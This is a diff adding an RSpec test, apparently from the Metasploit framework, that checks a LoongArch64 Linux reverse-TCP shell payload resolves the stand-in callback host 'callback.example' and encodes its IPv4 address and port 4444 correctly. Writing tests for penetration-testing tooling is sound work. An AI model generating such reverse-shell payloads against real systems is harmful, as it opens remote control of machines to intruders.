@@ -40,6 +40,15 @@ RSpec.describe 'modules/payloads/singles/linux/loongarch64/shell_reverse_tcp' do
       end
     end
 
+    it 'resolves a hostname to an IPv4 callback address' do
+      subject.datastore['LHOST'] = 'callback.example'
+      allow(Rex::Socket).to receive(:getaddress).with('callback.example', false).and_return('192.0.2.128')
+
+      words = subject.generate.unpack('V*')
+      sockaddr = [decoded_constant(words[9, 4])].pack('Q<')
+      expect(sockaddr).to eq([2].pack('v') + [4444].pack('n') + [192, 0, 2, 128].pack('C4'))
+    end
+
     it 'rejects IPv6 addresses' do
       subject.datastore['LHOST'] = '::1'
       expect { subject.generate }.to raise_error(ArgumentError, /IPv4/)
